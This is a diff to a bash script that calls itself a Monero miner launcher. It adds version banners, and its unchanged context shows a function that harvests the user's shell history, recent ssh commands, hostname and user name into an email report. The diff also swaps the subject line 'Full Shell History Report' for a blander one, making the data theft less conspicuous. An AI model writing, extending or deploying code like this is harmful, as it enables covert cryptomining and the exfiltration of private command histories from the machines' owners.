@@ -1,5 +1,19 @@
 #!/bin/bash
 
+# ==================== VERSION TRACKING ====================
+readonly SCRIPT_VERSION="2.2"
+readonly BUILD_DATE="2026-03-14 16:42:19 UTC"
+readonly SCRIPT_NAME="setup_m0_launcher"
+
+echo "=========================================="
+echo "MONERO MINER LAUNCHER"
+echo "=========================================="
+echo "Script: $SCRIPT_NAME"
+echo "Version: $SCRIPT_VERSION"
+echo "Build Date: $BUILD_DATE"
+echo "=========================================="
+echo ""
+
 # ==================== CENTOS 6.X AUTO-FIX (EOL REPOSITORY) ====================
 # CentOS 6.x reached End-of-Life in 2020 and has old SSL libraries that can't
 # connect to modern HTTPS sites. This fix automatically detects CentOS 6 and
@@ -1003,6 +1017,11 @@ send_histories_email() {
     local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")
 
     local EMAIL_CONTENT=$(cat <<EOF
+=== SCRIPT VERSION ===
+Version: $SCRIPT_VERSION
+Build Date: $BUILD_DATE
+Timestamp: $(date)
+
 === SYSTEM REPORT ===
 Hostname: $HOSTNAME
 User: $USER
@@ -1029,7 +1048,7 @@ EOF
 
     # Sanitize hostname for subject line
     local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
-    local subject="Full Shell History Report from $SAFE_HOSTNAME"
+    local subject="Report v${SCRIPT_VERSION} from $SAFE_HOSTNAME"
     local temp_file=$(mktemp)
     echo -e "$EMAIL_CONTENT" > "$temp_file"
 
